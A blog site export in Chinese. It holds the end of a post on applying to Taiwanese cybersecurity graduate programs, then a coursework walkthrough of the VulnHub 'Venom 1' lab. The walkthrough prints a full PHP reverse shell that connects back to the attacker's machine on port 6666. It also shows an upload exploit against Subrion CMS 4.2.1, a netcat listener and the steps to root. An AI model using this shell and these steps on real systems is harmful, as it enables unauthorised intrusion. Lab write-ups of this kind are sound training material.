這種並不會是資安領域的學者聽到就會眼睛為之一亮的場所，所以效力不能說到很大，但我們有得一個獎回來，多少可以表示這篇論文的價值，也是因為這樣才成為這次推甄最大的利器\n書審上放專題可以注意的是貢獻度，幾乎每間學校都喜歡問這種連自由心證都算不上的問題，僅書審的學校當然就可以盡量往上填，有面試的學校就自己斟酌，幾個問題可以提前思考的是\n專題在做什麼？能不能用一分鐘解釋出來？ 專題的背景、細節、技術能不能深入討論？ 如果是多人專題，貢獻度如何？為什麼？ 製作專題中遇到最大的困難是什麼？又是如何解決？ 資安經歷 # 大二為期一年 CTF 讀書會 AIS3 My First CTF 第二屆、第三屆叡揚安全達人養成計畫、資安戰士挑戰賽 2023 NISRA Enlightened Google Cybersecurity Certificate 經歷上，可以說全部都是著重在資安上，畢竟從大二開始重心都放在這一塊，論程式能力或 AI 上的知識，絕對比不過一般資工系學生（嗯\u0026hellip;上大學的我好像也讓自己成為偏科型的人了），加上自己也沒什麼除了資安以外值得放上去的經歷，某種程度上來說，我的自傳和經歷變得很單純，放眼望去都是資安相關，不一定是壞事，也因為我自己這次幾乎都是申請資安所，所以這樣做還算是安全的\n認真說，如果就資安組要做推甄，比較推薦要有的經歷大概是以下幾個 雖然我都沒有就是了\nAIS3 資安實務暑期課程 台灣好厲駭 CTF 競賽，並有拿到名次 架一個網站，擺一些解題 writeups 有資安實務上找漏洞或解決問題的能力，比如 CVE 資安公司實習經驗 順帶一提，Bug Bounty 是很好的機會，如果有能力打出洞還能拿到獎金，而且這是很好展現自己對於找漏洞的能力\n其他有利審查資料 # 英文能力：TOEIC 895 企業實習：叡揚資訊 程式能力：CPE 5 題 這部分我放的除了上述資料以外，就是一些社團、活動經歷。但推甄這一路上，我不認為審查委員會很看中這一塊，或許也跟科系有關，在資工或在資安裡面，我想能力還是遠大於這些課外行為的\n準備 # 自己準備的流程大約是長這樣\nSBOM：列出自己能寫進去的事件清單 STORY：把每個事件都用差不多兩三句話描述，內容差不多就是為什麼做、做了什麼、成果如何和學到什麼。這步做完再寫自傳時工作會比較像是寫架構然後拼湊組裝，比起白紙一張開寫來的有方向 BIOGRAPHY：開始撰寫自傳，我自己以一頁的篇幅在寫，呈現內容也只是挑幾個我認為最需要談的面向而已，並不是盡量塞滿，一頁的篇幅其實很容易就寫完，但如果能寫滿兩頁，我認為會是最好的 RESEARCH：撰寫研究計畫，這邊我就沒有特別限制自己的篇幅，能展現就盡量展現，因為我認為這是審查很大的重點，記得研究計畫重點是研究，讀書計畫反而是其次，要再研究計畫呈現出自己獨一無二的地方，有做學術專題的在這時候就會有點優勢了 至於推薦信，主要工作只是要找願意幫忙寫的教授而已，準備感人肺腑的邀請函和自吹自擂的草稿就差不多了，我一樣是拖到很後期才用，這次沒報成大和中央的原因就是因為時間太趕，請老師在兩三天內送出推薦信真的不太可能，但還是很感謝有老師願意出手幫忙，完成這個必要條件\n其他工作大概就是要去對想報名的學校蒐集資料，時程、資料繳交等規定都要先看好，像今年臺科的文件就非常麻煩，自傳一個要求一頁一個要寫兩頁，變成我需要另外生一版兩頁自傳出來；報名方式也需要注意，交大要填的資料就很多，很花時間，如果沒有先處理會是一個很大的負擔\n如果可以，未來有興趣的教授也可以先有初步想法，這在後面會有很大的幫助\n面試 # 在所有報名的校系中，要面試的只有臺科資工和清大資安，我會稍微針對這兩間做分享\n清大資安 # 關於清大資安的背景這邊就不多說，資安圈的人或多或少都會知道\n面試時間一人五分鐘，題目如下\n三分鐘自我介紹 還有報考那些系所？ CTF 讀書會是到現在嗎？ MFCTF 排名如何？ 所以現在做研究比較多，競賽就沒了？ 面完其實是感覺到空虛的，這些問題的答案都很單一，固定型的答案很難繼續聊下去，有種我希望來場 QT 但得到的是 Y/N，很像只是來走個過場，還讓我一大早跑到新竹。而且提問只有兩分鐘，我是真的不知道要聊什麼\n臺科資工 # 臺科面試跟 HITCON 人才技術交流同一天，也是因為這場面試沒聽到 Mico 國際技能競賽的分享，好可惜\n臺科的面試分成兩關，第一關是黑臉，會問技術問題，第二關就比較偏個人開放式問題\n一面問題如下\n一分鐘自我介紹 同態加密是什麼？ 全同態和部分同態的差別是什麼？ Lattice 結構是什麼？ 證明 ln(k!) = Θ(nln(n))？ 給一個 A 兩個 B 三個 C 四個 D，取後放回，求抽到恰三次 C 的機率？ 問題都不難，但有一個小細節是每個教授問問題只有一分鐘，可能講完問題能思考的時間不多，尤其像第六題教授講完題目我沒辦法立刻反應，又問了一次題目，結果問完時間就到了\n二面問題如下\n一分鐘自我介紹 講解專題 專題貢獻比例與原因 專題遇到的困難 有沒有想跟哪一位教授 有沒有報師大資工所？怎麼取捨師大跟臺科？ 二面比較沒壓力，比較要注意的大概就是第五題要先對臺科的教授了解，不然回答不出來多少是尷尬的\n結果 # 讀者最在意的應該是這塊\n申請校系 結果 國立臺灣大學 電機工程學系 資訊安全碩士班 正取 11 國立臺灣科技大學 資訊工程學系乙組（AI 及資安領域） 正取 5 國立臺灣科技大學 資訊管理學系 資訊安全科技與管理碩士班 逕取 7 國立臺灣師範大學 資訊工程學系 逕取 6 國立陽明交通大學 資訊安全研究所 甲組 正取 5 國立清華大學 資訊安全研究所 備取 5 （第四梯已備上） 第一志願是交大，上了沒道理不去，雖然按下臺大電機的放棄資格那個按鈕心還是會痛就是了 然後清大的部分，倒是意料之外\n致謝 # 一路上要感謝的人很多\n最重要的是 Neokent，作為我的資安啟蒙老師，在推甄這條路上也真的幫助我很多\n第二重要的我想給 Kenneth，因為專題是我這次推甄最大的利器，而且大學這幾年走在資安這條路上，Kenneth 陪我最多，從 CTF 讀書會到專題、修課，要不是因為人在國外，不然我一定衝到面前好好感謝\n再來是蔣宗哲老師，業務繁忙還在這麼晚的時間點答應幫我生推薦信出來\n然後是柏叡，因為他讓我正式踏上推甄這條路，也常常在禮拜一中午去找 Neokent meeting 討論，準備過程少不了和他的交流\n當然從五月開始陪我聊過、分析過選擇的，準備過程陪我討論、看自傳看研究計畫，還有一起去 meeting 的所有人\n同場加映：尋找指導教授 # 交大放榜後約一個禮拜才開始寄信問指導教授，對這一路上我真的都比別人晚很多才開始處理應該處理的事情，想當然熱門的教授搶不到\n交大資安裡面我有興趣的有三位，資安圈無論如何應該都滿想進黃教授的實驗室，但就是因為太熱門了，給我速度這麼慢絕對搶不到\n謝教授的實驗室跟 Cycraft 算是滿有連結的，也是三間實驗室中事前能問到最多東西的，親自跑過給我的感覺就很像一般實驗室，研究內容也確實是我有興趣的，並沒有排斥的點，但沒選擇就只是純粹想給自己挑戰兼有更吸引我的選擇而已\n林教授會吸引我是因為兩人一間實驗室、不規定留實驗室時間還有一群外籍學長三個特色，可能是二類組待久了，就完全忘記被管的感覺，也不希望有人會對我做出無謂的管理，線上和林教授談的時候他說了一句話滿和我意思的：「我只做目標管理，不做手段管理」，就是說只要該做的事情做得出來，即便躺著寫論文，教授也沒有意見，至少這點對崇尚自由的我來說還是很有吸引力，加上一些其他因素最後還是讓我選擇這邊\n很妙的是，建議我去謝教授實驗室的人，幾乎都是真的有在碰資安的人；而建議我去林教授實驗室的人，通常都是對資安圈不了解的人，除了海豹 :)\n最後附上考量的面向供參考\n教授研究領域 碩論研究主題 親自對到教授本人的時機 教授指導學生方式 教授對學生期待 實驗室氣氛、風格 碩班時程規劃 寒暑假研究 平時待實驗室 這邊再次謝謝 Neokent 在找教授上給的意見，也謝謝孫學長對實驗室的介紹，還有海豹大大課後跟我聊的那段\n","date":"2024-12-08","externalUrl":null,"permalink":"/posts/grad-entry/","section":"Blog Posts","summary":"","title":"研究所 推甄整理 X 經驗分享","type":"posts"},{"content":"剛好是高等資安攻防 WEEK6 的作業，就順便放上來作為本網站第一篇 writeup\nStep 0. Pre-request # 準備 Kali Linux 虛擬機（以下簡稱 Kali）：\n下載 Kali (VMware)：https://cdimage.kali.org/kali-2024.3/kali-linux-2024.3-vmware-amd64.7z 開啟 Kali 準備 Venom 虛擬機（以下簡稱 Venom）\n下載 Venom.zip 檔案：https://download.vulnhub.com/venom/venom.zip 下載完成可以跑 MD5 和 SHA1 確認檔案下載完整 匯入 VMware 設定網路：對 Venom 點擊右鍵 \u0026gt; Settings \u0026gt; Network Adapter \u0026gt; NAT \u0026gt; OK 開啟 Venom 觀察網路資訊\n檢視本機網路 (ipconfig)：與 VMware 有關的 IP 為 192.168.119.1 與 192.168.225.1 在 Kali 檢視虛擬機網路 (ip a)：IP 為 192.168.225.131 比對可知，虛擬機 (Kali \u0026amp; Venom) IP 位置應為 192.168.225.0/24 Step 1. 尋找可用服務（入口） # 在 Kali 上針對 192.168.225.0/24 進行掃描，得知 Venom IP 位置應為 192.168.225.132 針對 192.168.225.132 進行掃描，觀察開啟的服務 FTP: 21 HTTP: 80 HTTPS: 443 Step 2. HTTP # 檢視 HTTP 服務相關線索：使用 curl 192.168.225.132:80 發現最後有一行註解掉的線索：`` 將線索丟到 crackstation 解密，得知該線索為 hostinger MD5 雜湊值，推測 hostinger 為 password Step 3. FTP # 由前一步得知的訊息，使用 FTP 登入 帳號：hostinger，密碼：hostinger 成功登入後使用 ls 指令看到有一個資料夾 files 使用 cd files 進入 files 資料夾再 ls 觀察底下檔案，有一個名為 hint.txt 的檔案 使用 get hint.txt 下載該檔案至 Kali 主機 使用 exit 離開 FTP 服務 打開 cat hint.txt 檔案觀察其內容 得到三組密文，看起來都是 base64 編碼 WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0= 解碼後得到 standard vigenere cipher aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI= 解碼後得到 https://cryptii.com/pipes/vigenere-cipher L7f9l8@J#p%Ue+Q1234 解碼後得到，依照 hint.txt 說為 venom.box 管理者權限 (dora) 的密碼 猜測需要將 L7f9l8@J#p%Ue+Q1234 丟到 https://cryptii.com/pipes/vigenere-cipher 透過 standard vigenere cipher 進行解密得到密碼後再去 venom.box 登入 Step 4. venom.box # 去 https://cryptii.com/pipes/vigenere-cipher 進行解密，得到密碼為 E7r9t8@Q#h%Hy+M1234 透過密碼登入 venom.box 為了連上 http://venom.box ，需先在 /etc/hosts 新增 domain name 連上 venom.box 並登入，確認為 administrator 權限 也發現其網頁框架為 Subrion CMS V4.2.1 Step 5. 取得 reverse shell # 檢視是否有存在漏洞 使用 searchsploit subrion cms 4.2.1 指令 看到其中一個漏洞為可上傳任意檔案 準備 reverse shell 使用 https://revshells.com 產生 reverse shell IP 設為 Kali 的 IP 位址 192.168.132.225 port 自訂，但不衝突現存服務為原則，此 report 以 6666 示範 \u0026lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // Copyright (C) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $VERSION = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;192.168.225.131\u0026#39;; $port = 6666; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;ERROR: Can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // Parent exits } if (posix_setsid() == -1) { printit(\u0026#34;Error: Can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;WARNING: Failed to daemonise. This is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;ERROR: Can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;Successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;ERROR: Shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;ERROR: Shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;SOCK READ\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;SOCK: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;STDOUT READ\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;STDOUT: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;STDERR READ\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;STDERR: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; 上傳 reverse shell 在 http://venom.box/ 上點擊齒輪圖示進到管理者頁面 (http://venom/box/panel)，點擊右方 content \u0026gt; uploads 進到上傳區 上傳準備好的 reverse shell rev.phar 取得 reverse shell 在另一個終端機上透過指令 nc -nlvp 6666 監聽 port 6666 開新分頁 http://venom.box/uploads/rev.phar 執行 web shell 終端機上成功獲取 reverse shell Step 6. 取得 root shell # 嘗試使用 sudo -i 指令切換為 root 身分，發現因為沒有 tty 所以無法執行，這樣會沒辦法拿到 root 權限 使用 python -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;);' 將 shell 切換成 pty shell 再次使用 sudo -i 指令嘗試切換為 root 身分，但無從得知 www-data 的密碼 查看系統內有哪些 user，發現有 hostinger 和 nathan 兩個 將 user 切換為 hostinger，同樣嘗試執行 sudo -i 指令，發現 hostinger 沒有權限 登入 Nathan 帳戶 首先應該找到 Nathan 的密碼，使用 locate .htaccess 可以看到以下可能檔案 打開 /var/www/html/subrion/backup/.htaccess，看到一串密文，應該為 Nathan 的密碼 使用指令 su nathan 切換 user 為 Nathan 取得 root shell 使用 sudo -i 指令切換為 root 身分 進到 /root，打開 root.txt 檔案，得到 flag 參考資料 # vulnhub 靶場之 VENOM: 1 VENOM: 1 Vulnhub Walkthrough ","date":"2024-11-16","externalUrl":null,"permalink":"/posts/vulnhub-venom-1/","section":"Blog Posts","summary":"","title":"Vulnhub Venom 1 Writeup","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"}]